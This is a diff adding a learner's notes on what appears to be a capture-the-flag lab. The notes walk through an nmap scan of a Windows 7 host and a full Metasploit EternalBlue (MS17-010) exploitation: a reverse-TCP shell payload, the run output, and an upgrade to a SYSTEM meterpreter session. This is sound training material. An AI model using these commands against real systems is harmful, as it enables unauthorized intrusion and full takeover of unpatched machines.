@@ -1,0 +1,301 @@
+the result of nmap scan 
+nmap -sC -sV 10.10.207.217
+
+////////////////////////////////////////////
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 09:47 UTC
+Nmap scan report for 10.10.207.217
+Host is up (0.088s latency).
+Not shown: 991 closed tcp ports (conn-refused)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+| ssl-cert: Subject: commonName=Jon-PC
+| Not valid before: 2025-04-22T09:45:14
+|_Not valid after:  2025-10-22T09:45:14
+|_ssl-date: 2025-04-23T09:49:06+00:00; 0s from scanner time.
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-04-23T04:48:49-05:00
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:91:0d:f4:55:6d (unknown)
+| smb2-time: 
+|   date: 2025-04-23T09:48:49
+|_  start_date: 2025-04-23T09:45:12
+|_clock-skew: mean: 1h15m00s, deviation: 2h30m01s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 95.03 seconds
+
+
+
+/////////////////////////////////////////////
+
+there are 3 ports open with a port number under 1000?
+
+lets now figure whats the machine vulnerable to
+//////////////////////////////
+
+From the Nmap output:
+
+445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
+
+This means:
+
+    It's Windows 7 SP1 — an OS known to be vulnerable to EternalBlue if it's not patched.
+
+    EternalBlue specifically targets Windows systems from XP to 7 and Server 2003 to 2008 R2, particularly those with SMBv1 enabled.
+
+
+
+/////////////////////////////////////////
+
+so it might be vulnerable to vulnerable to MS17-010 (EternalBlue)
+which became eventually true 
+
+now lets Start Metasploit
+
+
+and 
+
+Find the exploitation code we will run against the machine. 
+
+lets type  search MS17-010 in msf 
+
+the result 
+//////////////////
+
+msf6 > search MS17-010
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
+
+/////////////////
+
+so this is the path for the exploitation : exploit/windows/smb/ms17_010_eternalblue
+
+
+///////////////////////////////////
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+
+
+//////////////////////////////////////////////////////
+
+Show options and set the one required value. What is the name of this value? (All caps for submission)
+
+
+which is RHOSTS
+
+////////////////////////////////////
+
+lets set the payload : msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+
+///////////////////////////////////////
+
+
+
+
+the options 
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.207.217    yes       The target host(s), see https://docs.metasploit
+                                             .com/docs/using-metasploit/basics/using-metaspl
+                                             oit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authen
+                                             tication. Only affects Windows Server 2008 R2,
+                                             Windows 7, Windows Embedded Standard 7 target m
+                                             achines.
+   SMBPass                         no        (Optional) The password for the specified usern
+                                             ame
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Ta
+                                             rget. Only affects Windows Server 2008 R2, Wind
+                                             ows 7, Windows Embedded Standard 7 target machi
+                                             nes.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only
+                                              affects Windows Server 2008 R2, Windows 7, Win
+                                             dows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process,
+                                        none)
+   LHOST     10.21.144.196    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+
+
+//////////////////////////////////////////////
+
+
+now i penetrated inside the machine 
+
+
+///////////////////////////////////////////////
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 10.21.144.196:4444 
+[*] 10.10.207.217:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.207.217:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.207.217:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.207.217:445 - The target is vulnerable.
+[*] 10.10.207.217:445 - Connecting to target for exploitation.
+[+] 10.10.207.217:445 - Connection established for exploitation.
+[+] 10.10.207.217:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.207.217:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.207.217:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.207.217:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.207.217:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.207.217:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.207.217:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.207.217:445 - Sending all but last fragment of exploit packet
+[*] 10.10.207.217:445 - Starting non-paged pool grooming
+[+] 10.10.207.217:445 - Sending SMBv2 buffers
+[+] 10.10.207.217:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.207.217:445 - Sending final SMBv2 buffers.
+[*] 10.10.207.217:445 - Sending last fragment of exploit packet!
+[*] 10.10.207.217:445 - Receiving response from exploit packet
+[+] 10.10.207.217:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.207.217:445 - Sending egg to corrupted connection.
+[*] 10.10.207.217:445 - Triggering free of corrupted buffer.
+[*] Sending stage (336 bytes) to 10.10.207.217
+[*] Command shell session 1 opened (10.21.144.196:4444 -> 10.10.207.217:49234) at 2025-04-23 10:30:22 +0000
+[+] 10.10.207.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.207.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.207.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+C:\Windows\system32>
+
+/////////////////////////////////
+
+
+now lets transforme the windows shell to meterpreter 
+
+by typing sessions -u nb_of_session in the background 
+
+
+////////////////////////////
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.21.144.196:4433 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+[*] Sending stage (203846 bytes) to 10.10.207.217
+[*] Meterpreter session 4 opened (10.21.144.196:4433 -> 10.10.207.217:49251) at 2025-04-23 10:44:28 +0000
+[*] Stopping exploit/multi/handler
+Interrupt: use the 'exit' command to quit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         shell x64/windows        Shell Banner: Microsoft Wi  10.21.144.196:4444 -> 10.10
+                                     ndows [Version 6.1.7601] -  .207.217:49234 (10.10.207.2
+                                     ----                        17)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-  10.21.144.196:4433 -> 10.10
+                                     PC                          .207.217:49245 (10.10.207.2
+                                                                 17)
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-  10.21.144.196:4433 -> 10.10
+                                     PC                          .207.217:49247 (10.10.207.2
+                                                                 17)
+  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-  10.21.144.196:4433 -> 10.10
+                                     PC                          .207.217:49251 (10.10.207.2
+                                                                 17)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+
+
+////////////////////////////////////////
+
+
+
+now lets use one of the meterpreter sessions 
+
+
+lets access it 
+
+///////////////////////////////////////////
+
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 4
+[*] Starting interaction with 4...
+
+meterpreter > 
+
+
+/////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
